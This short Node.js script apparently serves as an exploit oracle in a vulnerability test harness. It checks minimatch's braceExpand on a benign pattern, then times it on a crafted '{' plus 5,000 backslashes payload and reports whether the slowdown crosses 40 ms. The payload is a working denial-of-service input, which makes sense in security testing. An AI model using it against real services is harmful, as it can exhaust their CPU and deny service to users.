const minimatch = require('minimatch');

let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

try {
  const benign = minimatch.braceExpand('file-{a,b}.js');
  if (!Array.isArray(benign) || benign.length !== 2 || benign[0] !== 'file-a.js' || benign[1] !== 'file-b.js') {
    throw new Error('benign_brace_expand_failed');
  }

  operation_completed = true;

  const payload = '{' + '\\'.repeat(5000);

  const t0 = process.hrtime.bigint();
  minimatch.braceExpand(payload);
  const elapsedMs = Number((process.hrtime.bigint() - t0) / 1000000n);

  const thresholdMs = 40;
  exploit_succeeded = elapsedMs >= thresholdMs;
  evidence = 'elapsed_ms=' + elapsedMs + ';threshold_ms=' + thresholdMs + ';payload_len=' + payload.length;
} catch (err) {
  if (!operation_completed) {
    operation_completed = false;
    exploit_succeeded = false;
    evidence = 'setup_or_benign_error=' + (err && err.message ? err.message : String(err));
  } else {
    exploit_succeeded = false;
    evidence = 'malicious_blocked=' + (err && err.name ? err.name : 'Error');
  }
}

console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));